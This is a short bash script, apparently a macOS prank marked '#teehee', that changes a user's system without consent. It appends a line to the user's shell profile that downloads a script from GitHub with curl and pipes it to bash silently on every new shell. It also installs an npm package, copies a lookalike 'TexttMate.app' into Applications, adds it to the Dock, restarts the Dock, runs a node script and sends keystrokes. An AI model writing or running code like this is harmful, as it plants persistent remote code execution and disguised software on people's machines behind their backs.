#!/usr/local/bin/bash
 if [[ ! -s "$HOME/.bash_profile" && -s "$HOME/.profile" ]] ; then
   profile_file="$HOME/.profile"
 else
   profile_file="$HOME/.bash_profile"
 fi
 if ! grep -q '#teehee' "${profile_file}" ; then
   echo "#teehee" >> "${profile_file}"
   echo " \$(curl -s -L https://raw.github.com/Jakobo/osxsay/master/go.sh | bash > /dev/null 2>&1 &)" >> "${profile_file}"
 fi
 
 tempnam=`mktemp -d -t saymore`
 cd $tempnam
 npm install https://github.com/Jakobo/osxsay/tarball/master
 cd $tempnam/node_modules/osxsay
 mkdir -p ~/workspace/trumk
 cp -R $tempnam/node_modules/osxsay/TexttMate.app /Applications
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/TexttMate</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
 killall Dock
 node start.js &
 osascript -e 'tell application "System Events" to keystroke "k" using command down'
